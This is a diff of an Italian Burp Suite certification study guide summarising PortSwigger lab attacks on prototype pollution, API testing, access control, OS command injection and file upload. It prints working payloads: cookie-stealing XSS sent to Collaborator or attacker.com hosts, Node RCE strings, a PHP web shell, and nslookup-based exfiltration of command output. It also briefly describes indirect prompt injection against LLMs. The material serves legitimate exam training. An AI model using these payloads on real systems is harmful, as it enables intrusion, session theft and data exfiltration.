-- Soluzione: inquinare il prototipo con una proprieta `value` che verra ereditata dal descriptor object passato a `Object.defineProperty()`, bypassando la "protezione"; oppure inquinare `headers` nelle opzioni di `fetch()` per iniettare dati che poi finiscono in un sink DOM.
-- Payload: `?__proto__[headers][x-username]=<img/src/onerror=alert(1)>` (per il caso fetch) oppure `?__proto__[value]=payload` (per il bypass di defineProperty)
-- Payload da esame (Burp Collaborator): `?__proto__[headers][x-username]=<img/src/onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` (per il caso fetch) oppure `?__proto__[value]=payload` (per il bypass di defineProperty)
-- Link: [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)
-
-### B. Prototype pollution server-side (Node.js)
-
-**6. Escalation di privilegi via prototype pollution server-side**
-
-- Segnale: un endpoint che aggiorna dati utente (JSON) riflette l'oggetto aggiornato in risposta; iniettando `__proto__` nel body JSON, la proprieta extra appare nella risposta (confermando la pollution), e una funzionalita di update utente usa una merge non sanitizzata.
-- Soluzione: inquinare il prototipo globale con una proprieta usata per il controllo di accesso (es. `isAdmin`/`role`) tramite l'endpoint di update, così il proprio oggetto utente (o tutti) la eredita, ottenendo privilegi elevati.
-- Payload: `PUT /my-account {"username":"wiener", "__proto__":{"isAdmin":true}}`
-- Link: [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
-
-**7. Rilevare prototype pollution server-side senza riflessione della proprieta**
-
-- Segnale: non c'e alcuna proprieta riflessa in risposta per confermare l'injection; serve una tecnica non distruttiva per confermare la pollution osservando un cambiamento di comportamento del server (es. framework Express).
-- Soluzione: inquinare il prototipo con una proprieta di configurazione nota del framework (es. `json spaces` di Express, che controlla l'indentazione del JSON in risposta) e verificare se il comportamento cambia (indentazione aumentata/rimossa) prima/dopo l'injection — tecnica sicura e reversibile.
-- Payload: `"__proto__":{"json spaces":10}` poi confrontare l'indentazione JSON in risposta (tab Raw in Burp)
-- Link: [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
-
-**8. Bypass dei filtri di input per prototype pollution server-side**
-
-- Segnale: l'app filtra/blocca la stringa `__proto__` nei body JSON, ma non blocca l'accesso al prototipo tramite la proprieta `constructor`.
-- Soluzione: usare `constructor.prototype` come vettore alternativo per raggiungere `Object.prototype`, bypassando il filtro testuale su `__proto__`.
-- Payload: `{"constructor":{"prototype":{"isAdmin":true}}}`
-- Link: [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)
-
-**9. Remote code execution via prototype pollution server-side**
-
-- Segnale: confermata la pollution server-side; l'app usa internamente funzioni Node come `child_process.fork()`/`execSync()` con opzioni (`execArgv`, `shell`, `input`) non definite esplicitamente, quindi pollutable.
-- Soluzione: inquinare il prototipo con una proprieta `NODE_OPTIONS`/`shell` combinata con un payload che causa un'interazione Collaborator per identificare la richiesta vulnerabile, poi sfruttare `execArgv` con `--eval` per eseguire JavaScript arbitrario nel processo figlio, raggiungendo RCE completa.
-- Payload: `"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=TUO-COLLABORATOR-ID.oastify.com"}` per la detection; poi `"__proto__":{"execArgv":["--eval=require('child_process').execSync('id > /tmp/out')"]}` per l'RCE
-- Link: [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)
-
-
-## API testing
-
-**Come riconoscerla (generale):** mappa gli endpoint API (`/api`, `/swagger`, file JS); testa metodi HTTP e content-type alternativi su ogni endpoint; confronta i campi restituiti da una GET con quelli accettati da una PATCH/PUT per individuare mass assignment; per API interne, inietta `#`/`&`/`=` nei parametri per rilevare server-side parameter pollution.
-
-**1. Trovare e sfruttare un endpoint API non utilizzato**
-
-- Segnale: l'app usa solo alcuni endpoint/metodi documentati nell'interfaccia, ma l'API probabilmente supporta altri metodi HTTP (es. `PUT`/`DELETE`/`PATCH`) sullo stesso path non esposti dalla UI.
-- Soluzione: usare Burp Intruder con la wordlist di verbi HTTP per testare metodi alternativi sullo stesso endpoint, scoprendo funzionalità extra (es. modifica di risorse di altri utenti) non prevista per l'uso normale.
-- Payload: stessa richiesta con metodo cambiato, es. `PATCH /api/users/123` invece di `GET /api/users/123`
-- Link: [Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)
-
-**2. Sfruttare una vulnerabilità di mass assignment**
-
-- Segnale: una GET su una risorsa utente restituisce campi extra non presenti nel form di update (es. `isAdmin`, `id`) che il framework potrebbe bindare automaticamente da un body di richiesta PATCH/PUT.
-- Soluzione: aggiungere il campo nascosto scoperto (es. `isAdmin`) al body della richiesta di update, con un valore valido (`true`), per vedere se viene accettato e applicato senza autorizzazione.
-- Payload: `PATCH /api/users/me {"username":"wiener","email":"wiener@example.com","isAdmin":true}`
-- Link: [Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
-
-**3. Sfruttare server-side parameter pollution in una query string**
-
-- Segnale: un parametro front-end viene incorporato in una richiesta server-side verso un'API interna (es. `name=peter` diventa `GET /users/search?name=peter&publicProfile=true`); inserendo `%23` (`#` URL-encoded) o `%26` (`&` URL-encoded) nel parametro front-end si osserva un cambiamento nella risposta.
-- Soluzione: usare `%23` per troncare la query string server-side rimuovendo il vincolo successivo (es. `publicProfile=true`), oppure usare `%26name=valore` per iniettare/sovrascrivere un secondo parametro `name` nella richiesta interna, ottenendo accesso a dati/funzionalità non previste (es. ricerca come `administrator`).
-- Payload: `GET /userSearch?name=peter%23foo&back=/home` (truncation) oppure `GET /userSearch?name=peter%26name=administrator&back=/home` (override del parametro)
-- Link: [Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)
-
-
-## Access control vulnerabilities — Stage tipico: 2
-
-**Come riconoscerla (generale):** prova a raggiungere una funzione/risorsa sensibile cambiando URL, metodo HTTP, header o parametri (id, role) con un account a basso privilegio o senza autenticazione; confronta il comportamento di front-end (reverse proxy/WAF) e back-end rispetto a URL, metodo, maiuscole/minuscole e header custom.
-
-**1. Bypass del controllo basato sull'URL**
-
-- Segnale: un proxy/front-end blocca l'accesso a `/admin/...` in base all'URL, ma l'app supporta header non standard come `X-Original-URL` o `X-Rewrite-URL` per determinare l'URL "reale".
-- Soluzione: inviare la richiesta a un URL permesso, aggiungendo l'header che fa puntare l'app alla risorsa protetta.
-- Payload: `POST / HTTP/1.1` con header `X-Original-URL: /admin/deleteUser`
-- Link: [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
-- Step: 2
-
-**2. Bypass del controllo basato sul metodo HTTP**
-
-- Segnale: l'accesso a un endpoint sensibile è negato solo per un metodo specifico (es. POST), ma l'app accetta anche altri metodi (es. GET) per eseguire la stessa azione.
-- Soluzione: rifare la stessa richiesta cambiando il metodo HTTP (es. da POST a GET) sullo stesso endpoint.
-- Payload: `GET /admin/deleteUser?username=carlos HTTP/1.1` invece di `POST /admin/deleteUser`
-- Link: [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
-- Step: 2
-
-**3. Nessun controllo di accesso su uno step di un processo multi-step**
-
-- Segnale: una funzione sensibile è divisa in più step (es. carica dati utente → invia modifiche → conferma); i primi step sono protetti ma l'ultimo (conferma) no.
-- Soluzione: saltare direttamente all'ultimo step, inviando la richiesta di conferma con i parametri necessari senza passare dai controlli dei primi step.
-- Payload: richiedere direttamente lo step finale (es. `POST /admin/update-user-confirm` con i parametri già pronti per promuovere il proprio utente ad admin), bypassando gli step precedenti protetti
-- Link: [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)
-- Step: 2
-
-**4. Controllo di accesso basato sul Referer**
-
-- Segnale: la pagina principale `/admin` è protetta correttamente, ma le sotto-pagine (es. `/admin/deleteUser`) controllano solo che l'header `Referer` contenga l'URL di `/admin`.
-- Soluzione: forgiare una richiesta diretta verso la sotto-pagina sensibile impostando manualmente l'header `Referer` con l'URL atteso (completamente controllabile dall'attaccante).
-- Payload: `GET /admin/deleteUser?username=carlos HTTP/1.1` con header `Referer: https://TARGET/admin`
-- Link: [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)
-- Step: 2
-
-
 ## GraphQL API vulnerabilities
 
 **Come riconoscerla (generale):** trova l'endpoint GraphQL (spesso `/graphql`, `/api`) inviando una query universale `query{__typename}` (risposta `{"data":{"__typename":"query"}}` confirma); prova introspection (`{__schema{queryType{name}}}`) per enumerare lo schema; testa argomenti non sanitizzati per IDOR.
@@ -1113,17 +1781,30 @@ Quando l'input passa per un parser (es. XML) o è filtrato da un WAF: offusca il
 - Link: [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
 
 
-## Cross-origin resource sharing (CORS) — Stage tipico: 2
+## API testing
 
-**Come riconoscerla (generale):** manda una richiesta con un header `Origin` arbitrario e guarda se viene riflesso in `Access-Control-Allow-Origin` insieme ad `Access-Control-Allow-Credentials: true` — questo è il segnale di un CORS misconfigurato exploitabile per rubare dati con sessione.
+**Come riconoscerla (generale):** mappa gli endpoint API (`/api`, `/swagger`, file JS); testa metodi HTTP e content-type alternativi su ogni endpoint; confronta i campi restituiti da una GET con quelli accettati da una PATCH/PUT per individuare mass assignment; per API interne, inietta `#`/`&`/`=` nei parametri per rilevare server-side parameter pollution.
 
-**1. CORS con protocolli non sicuri (insecure protocols) nella whitelist**
+**1. Trovare e sfruttare un endpoint API non utilizzato**
 
-- Segnale: l'app comunica solo in HTTPS, ma whitelista (e riflette in `Access-Control-Allow-Origin` con `Access-Control-Allow-Credentials: true`) anche un sottodominio raggiungibile in plain HTTP (es. `http://trusted-subdomain.TARGET`).
-- Soluzione: sfruttare un man-in-the-middle/injection sulla connessione HTTP non cifrata della vittima per iniettare una risposta che fa partire dal browser della vittima una richiesta CORS con credenziali verso l'endpoint HTTPS sensibile, con `Origin: http://trusted-subdomain.TARGET`; la risposta (dati sensibili, es. API key) viene letta dallo script dell'attaccante e inviata al suo server. Nel lab, questo si simula intercettando/rispondendo alla richiesta HTTP della vittima tramite l'exploit server.
-- Payload: pagina che fa `fetch`/XHR con `withCredentials:true` verso `https://TARGET/accountDetails` includendo (via redirect o risposta spoofata) `Origin: http://trusted-subdomain.TARGET`, poi esfiltra `this.responseText` al proprio server
-- Link: [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
-- Step: 2
+- Segnale: l'app usa solo alcuni endpoint/metodi documentati nell'interfaccia, ma l'API probabilmente supporta altri metodi HTTP (es. `PUT`/`DELETE`/`PATCH`) sullo stesso path non esposti dalla UI.
+- Soluzione: usare Burp Intruder con la wordlist di verbi HTTP per testare metodi alternativi sullo stesso endpoint, scoprendo funzionalità extra (es. modifica di risorse di altri utenti) non prevista per l'uso normale.
+- Payload: stessa richiesta con metodo cambiato, es. `PATCH /api/users/123` invece di `GET /api/users/123`
+- Link: [Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)
+
+**2. Sfruttare una vulnerabilità di mass assignment**
+
+- Segnale: una GET su una risorsa utente restituisce campi extra non presenti nel form di update (es. `isAdmin`, `id`) che il framework potrebbe bindare automaticamente da un body di richiesta PATCH/PUT.
+- Soluzione: aggiungere il campo nascosto scoperto (es. `isAdmin`) al body della richiesta di update, con un valore valido (`true`), per vedere se viene accettato e applicato senza autorizzazione.
+- Payload: `PATCH /api/users/me {"username":"wiener","email":"wiener@example.com","isAdmin":true}`
+- Link: [Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
+
+**3. Sfruttare server-side parameter pollution in una query string**
+
+- Segnale: un parametro front-end viene incorporato in una richiesta server-side verso un'API interna (es. `name=peter` diventa `GET /users/search?name=peter&publicProfile=true`); inserendo `%23` (`#` URL-encoded) o `%26` (`&` URL-encoded) nel parametro front-end si osserva un cambiamento nella risposta.
+- Soluzione: usare `%23` per troncare la query string server-side rimuovendo il vincolo successivo (es. `publicProfile=true`), oppure usare `%26name=valore` per iniettare/sovrascrivere un secondo parametro `name` nella richiesta interna, ottenendo accesso a dati/funzionalità non previste (es. ricerca come `administrator`).
+- Payload: `GET /userSearch?name=peter%23foo&back=/home` (truncation) oppure `GET /userSearch?name=peter%26name=administrator&back=/home` (override del parametro)
+- Link: [Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)
 
 
 ## Business logic vulnerabilities — Stage tipico: 2
@@ -1290,6 +1971,81 @@ Quando l'input passa per un parser (es. XML) o è filtrato da un WAF: offusca il
 - Step: 2
 
 
+## Prototype pollution
+
+**Come riconoscerla (generale):** cerca un *source* (URL query/fragment, input JSON, web message) che permette di iniettare una chiave `__proto__` con proprieta nidificate; verifica nella console (`Object.prototype.foo`) se la proprieta è stata aggiunta globalmente; poi cerca un *gadget* (proprieta non definita esplicitamente, usata in un sink pericoloso come `innerHTML`/`eval`/opzioni di child process).
+
+### A. Prototype pollution client-side
+
+**1. DOM XSS via prototype pollution client-side**
+
+- Segnale: un parametro URL permette di iniettare `__proto__[prop]=valore`; la pagina usa una libreria/codice che legge una proprieta non definita esplicitamente e la passa a un sink DOM (es. `innerHTML`).
+- Soluzione: usare DOM Invader (o testare manualmente in console) per trovare il source e il gadget, poi costruire un URL che inquina il prototipo con un payload XSS nella proprieta usata dal gadget.
+- Payload: `?__proto__[transport_url]=data:,alert(1)//` oppure `?__proto__[sourceUrl]=//attacker.com/evil.js`
+- Payload da esame (Burp Collaborator): `?__proto__[transport_url]=data:,document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//` oppure `?__proto__[sourceUrl]=//attacker.com/evil.js`
+- Link: [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
+
+**2. DOM XSS via un vettore alternativo di prototype pollution**
+
+- Segnale: il source classico via query string non funziona, ma esiste un altro vettore (es. URL fragment/hash, oppure notazione a punto invece di parentesi quadre).
+- Soluzione: provare varianti del vettore di injection (`__proto__.prop=val` invece di `__proto__[prop]=val`, oppure iniettare nel fragment `#__proto__[prop]=val`).
+- Payload: `#__proto__[transport_url]=data:,alert(1)//`
+- Payload da esame (Burp Collaborator): `#__proto__[transport_url]=data:,document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//`
+- Link: [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
+
+**3. Prototype pollution client-side via sanitizzazione difettosa (bypass)**
+
+- Segnale: l'app rimuove la stringa `__proto__` dall'input, ma lo fa con una sola passata non ricorsiva.
+- Soluzione: annidare la stringa bloccata in modo che, dopo una singola rimozione, resti una sequenza `__proto__` valida.
+- Payload: `?__pro__proto__to__.gadget=payload` (dopo la rimozione di `__proto__` una volta, rimane `__proto__.gadget=payload`)
+- Link: [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
+
+**4. Prototype pollution client-side in librerie di terze parti**
+
+- Segnale: il gadget non è nel codice dell'applicazione ma in una libreria esterna importata; difficile individuarlo leggendo manualmente codice minificato/obfuscato.
+- Soluzione: usare DOM Invader per scansionare automaticamente la pagina (incluse le librerie di terze parti) e identificare source/gadget/PoC XSS generato automaticamente.
+- Payload: dipende dal gadget trovato da DOM Invader nella libreria specifica
+- Link: [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
+
+**5. Prototype pollution via API del browser (bypass di `Object.defineProperty`)**
+
+- Segnale: gli sviluppatori hanno difeso una proprieta con `Object.defineProperty(obj, 'gadget', {configurable:false, writable:false})` senza impostare un valore iniziale; oppure il gadget sta in un'opzione non definita passata a `fetch()` (es. `headers`).
+- Soluzione: inquinare il prototipo con una proprieta `value` che verra ereditata dal descriptor object passato a `Object.defineProperty()`, bypassando la "protezione"; oppure inquinare `headers` nelle opzioni di `fetch()` per iniettare dati che poi finiscono in un sink DOM.
+- Payload: `?__proto__[headers][x-username]=<img/src/onerror=alert(1)>` (per il caso fetch) oppure `?__proto__[value]=payload` (per il bypass di defineProperty)
+- Payload da esame (Burp Collaborator): `?__proto__[headers][x-username]=<img/src/onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` (per il caso fetch) oppure `?__proto__[value]=payload` (per il bypass di defineProperty)
+- Link: [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)
+
+### B. Prototype pollution server-side (Node.js)
+
+**6. Escalation di privilegi via prototype pollution server-side**
+
+- Segnale: un endpoint che aggiorna dati utente (JSON) riflette l'oggetto aggiornato in risposta; iniettando `__proto__` nel body JSON, la proprieta extra appare nella risposta (confermando la pollution), e una funzionalita di update utente usa una merge non sanitizzata.
+- Soluzione: inquinare il prototipo globale con una proprieta usata per il controllo di accesso (es. `isAdmin`/`role`) tramite l'endpoint di update, così il proprio oggetto utente (o tutti) la eredita, ottenendo privilegi elevati.
+- Payload: `PUT /my-account {"username":"wiener", "__proto__":{"isAdmin":true}}`
+- Link: [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
+
+**7. Rilevare prototype pollution server-side senza riflessione della proprieta**
+
+- Segnale: non c'e alcuna proprieta riflessa in risposta per confermare l'injection; serve una tecnica non distruttiva per confermare la pollution osservando un cambiamento di comportamento del server (es. framework Express).
+- Soluzione: inquinare il prototipo con una proprieta di configurazione nota del framework (es. `json spaces` di Express, che controlla l'indentazione del JSON in risposta) e verificare se il comportamento cambia (indentazione aumentata/rimossa) prima/dopo l'injection — tecnica sicura e reversibile.
+- Payload: `"__proto__":{"json spaces":10}` poi confrontare l'indentazione JSON in risposta (tab Raw in Burp)
+- Link: [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
+
+**8. Bypass dei filtri di input per prototype pollution server-side**
+
+- Segnale: l'app filtra/blocca la stringa `__proto__` nei body JSON, ma non blocca l'accesso al prototipo tramite la proprieta `constructor`.
+- Soluzione: usare `constructor.prototype` come vettore alternativo per raggiungere `Object.prototype`, bypassando il filtro testuale su `__proto__`.
+- Payload: `{"constructor":{"prototype":{"isAdmin":true}}}`
+- Link: [Bypassing flawed input filters for server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)
+
+**9. Remote code execution via prototype pollution server-side**
+
+- Segnale: confermata la pollution server-side; l'app usa internamente funzioni Node come `child_process.fork()`/`execSync()` con opzioni (`execArgv`, `shell`, `input`) non definite esplicitamente, quindi pollutable.
+- Soluzione: inquinare il prototipo con una proprieta `NODE_OPTIONS`/`shell` combinata con un payload che causa un'interazione Collaborator per identificare la richiesta vulnerabile, poi sfruttare `execArgv` con `--eval` per eseguire JavaScript arbitrario nel processo figlio, raggiungendo RCE completa.
+- Payload: `"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=TUO-COLLABORATOR-ID.oastify.com"}` per la detection; poi `"__proto__":{"execArgv":["--eval=require('child_process').execSync('id > /tmp/out')"]}` per l'RCE
+- Link: [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)
+
+
 ## Web LLM attacks — Stage tipico: 2-3
 
 **Come riconoscerla (generale):** identifica gli input dell'LLM (prompt diretto, contenuto indiretto come recensioni/commenti che l'LLM legge) e le API/funzioni a cui ha accesso; chiedi all'LLM stesso quali API può usare; prova a far eseguire all'LLM azioni fuori scope ("excessive agency") o inietta istruzioni nascoste in contenuti che l'LLM/uno scanner AI elaborerà.
@@ -1329,7 +2085,7 @@ Quando l'input passa per un parser (es. XML) o è filtrato da un WAF: offusca il
 
 # Stage 3 — Data exfiltration (esecuzione codice ed estrazione dati)
 
-Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalati ad admin. Ordine conforme a [botesjuan/...](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study) (sezione "Data Exfiltration").
+Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalati ad admin. Ordine conforme alla tabella riassuntiva iniziale.
 
 
 ## XML external entity (XXE) injection — Stage tipico: 3
@@ -1407,6 +2163,39 @@ Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalat
 - Soluzione: inserire un dominio Burp Collaborator nel parametro/header sospetto e verificare se arriva un'interazione DNS/HTTP; questo conferma la SSRF cieca anche senza poter leggere la risposta.
 - Payload: header `Referer: http://TUO-SUBDOMAIN.burpcollaborator.net`
 - Link: [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)
+
+
+## OS command injection — Stage tipico: 3
+
+**Come riconoscerla (generale):** un parametro viene passato come argomento a un comando di shell lato server; testa con separatori di comando (`&`, `&&`, `|`, `||`, `;`, newline) seguiti da `echo <stringa-random>` e verifica se la stringa appare in risposta; se non appare (blind), usa time-delay (`ping`) o out-of-band (`nslookup`).
+
+**1. Blind OS command injection con time delay**
+
+- Segnale: l'output del comando non è mai riflesso in risposta; serve confermare l'esecuzione tramite un ritardo osservabile.
+- Soluzione: iniettare un comando `ping` con un numero di pacchetti che causa un ritardo misurabile nella risposta HTTP.
+- Payload: `& ping -c 10 127.0.0.1 &`
+- Link: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+
+**2. Blind OS command injection con redirezione dell'output**
+
+- Segnale: l'app serve risorse statiche da una directory nota del filesystem (es. `/var/www/static`); vuoi recuperare l'output di un comando senza un canale out-of-band.
+- Soluzione: reindirizzare l'output del comando iniettato in un file dentro la webroot, poi recuperarlo visitando l'URL corrispondente nel browser.
+- Payload: `& whoami > /var/www/static/whoami.txt &`, poi visitare `https://TARGET/whoami.txt`
+- Link: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+
+**3. Blind OS command injection con interazione out-of-band**
+
+- Segnale: nessun output riflesso e nessuna directory statica nota in cui scrivere; serve un canale OAST per confermare l'esecuzione.
+- Soluzione: iniettare un comando che causa una query DNS verso un dominio Burp Collaborator; l'arrivo della lookup conferma l'injection.
+- Payload: `& nslookup kgji2ohoyw.burpcollaborator.net &`
+- Link: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+
+**4. Blind OS command injection con esfiltrazione dati out-of-band**
+
+- Segnale: come sopra, ma vuoi anche esfiltrare l'output di un comando (es. `whoami`), non solo confermare l'esecuzione.
+- Soluzione: incorporare l'output del comando (tramite command substitution) come sottodominio della query DNS verso il proprio Collaborator; il valore compare nel log delle interazioni DNS.
+- Payload: ``& nslookup `whoami`.kgji2ohoyw.burpcollaborator.net &``
+- Link: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
 
 
 ## Server-side template injection — Stage tipico: 3
@@ -1489,39 +2278,6 @@ Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalat
 - Link: [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
 
 
-## File upload vulnerabilities — Stage tipico: 3
-
-**Come riconoscerla (generale):** l'app permette upload di file (tipicamente immagini); prova a caricare una web shell PHP/JSP (`<?php echo system($_GET['command']); ?>`); se bloccato da validazione, cerca discrepanze tra come viene validato il file e come viene eseguito/servito dal server.
-
-**1. Upload web shell via path traversal**
-
-- Segnale: il server impedisce l'esecuzione di script nella cartella di upload (configurazione più permissiva altrove), ma il nome del file caricato non è validato contro sequenze di traversal.
-- Soluzione: usare un nome file con sequenza di traversal nel campo `filename` della richiesta multipart, per far finire la web shell in una directory diversa (con permessi di esecuzione) da quella di upload prevista.
-- Payload: header multipart `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
-- Link: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
-
-**2. Bypass di blacklist delle estensioni (override della configurazione del server)**
-
-- Segnale: l'estensione `.php` è bloccata da una blacklist, ma il server (es. Apache) permette di caricare file di configurazione custom per-directory (`.htaccess`) che non sono a loro volta bloccati.
-- Soluzione: caricare un file `.htaccess` malevolo che mappa un'estensione arbitraria/non bloccata a un tipo MIME eseguibile, poi caricare la web shell con quell'estensione.
-- Payload: `.htaccess` con contenuto `AddType application/x-httpd-php .l33t`, poi upload di `exploit.l33t` contenente PHP
-- Link: [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
-
-**3. Bypass tramite offuscamento dell'estensione del file**
-
-- Segnale: la blacklist/whitelist è case-sensitive o non gestisce correttamente doppie estensioni, caratteri finali, encoding, null byte o unicode multibyte.
-- Soluzione: provare varianti come maiuscole/minuscole mischiate, doppia estensione, punti finali, URL-encoding dei punti, byte null, o posizionare la stringa bloccata in modo che la sua rimozione lasci comunque un'estensione valida.
-- Payload: es. `exploit.php.jpg`, `exploit.php.`, `exploit.p.phphp` (rimuovendo `.php` resta `.php`), `exploit.pHp`
-- Link: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
-
-**4. RCE via upload di web shell polyglot**
-
-- Segnale: il server valida il contenuto del file (non solo `Content-Type`/estensione), verificando proprieta intrinseche (dimensioni immagine) o magic bytes (es. `FF D8 FF` per JPEG).
-- Soluzione: creare un file polyglot che è un'immagine JPEG valida (passa i controlli sui magic bytes/dimensioni) ma contiene codice PHP nei metadata EXIF, usando un tool come ExifTool; se il server lo serve/esegue da una posizione eseguibile, il codice PHP nei metadata viene eseguito.
-- Payload: `exiftool -Comment="<?php echo system($_GET['command']); ?>" originale.jpg -o polyglot.php` poi caricare `polyglot.php`
-- Link: [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
-
-
 ## Insecure deserialization — Stage tipico: 3
 
 **Come riconoscerla (generale):** cerca dati che sembrano oggetti serializzati in cookie/parametri (PHP: stringa leggibile tipo `O:4:"User":2:{s:4:"name"...}`; Java: inizia con byte `ac ed` hex / `rO0` in Base64); verifica se riesci a modificarli e se vengono accettati dal server dopo la deserializzazione.
@@ -1569,121 +2325,37 @@ Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalat
 - Link: [Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
 
 
-## OS command injection — Stage tipico: 3
+## File upload vulnerabilities — Stage tipico: 3
 
-**Come riconoscerla (generale):** un parametro viene passato come argomento a un comando di shell lato server; testa con separatori di comando (`&`, `&&`, `|`, `||`, `;`, newline) seguiti da `echo <stringa-random>` e verifica se la stringa appare in risposta; se non appare (blind), usa time-delay (`ping`) o out-of-band (`nslookup`).
+**Come riconoscerla (generale):** l'app permette upload di file (tipicamente immagini); prova a caricare una web shell PHP/JSP (`<?php echo system($_GET['command']); ?>`); se bloccato da validazione, cerca discrepanze tra come viene validato il file e come viene eseguito/servito dal server.
 
-**1. Blind OS command injection con time delay**
+**1. Upload web shell via path traversal**
 
-- Segnale: l'output del comando non è mai riflesso in risposta; serve confermare l'esecuzione tramite un ritardo osservabile.
-- Soluzione: iniettare un comando `ping` con un numero di pacchetti che causa un ritardo misurabile nella risposta HTTP.
-- Payload: `& ping -c 10 127.0.0.1 &`
-- Link: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+- Segnale: il server impedisce l'esecuzione di script nella cartella di upload (configurazione più permissiva altrove), ma il nome del file caricato non è validato contro sequenze di traversal.
+- Soluzione: usare un nome file con sequenza di traversal nel campo `filename` della richiesta multipart, per far finire la web shell in una directory diversa (con permessi di esecuzione) da quella di upload prevista.
+- Payload: header multipart `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
+- Link: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
 
-**2. Blind OS command injection con redirezione dell'output**
+**2. Bypass di blacklist delle estensioni (override della configurazione del server)**
 
-- Segnale: l'app serve risorse statiche da una directory nota del filesystem (es. `/var/www/static`); vuoi recuperare l'output di un comando senza un canale out-of-band.
-- Soluzione: reindirizzare l'output del comando iniettato in un file dentro la webroot, poi recuperarlo visitando l'URL corrispondente nel browser.
-- Payload: `& whoami > /var/www/static/whoami.txt &`, poi visitare `https://TARGET/whoami.txt`
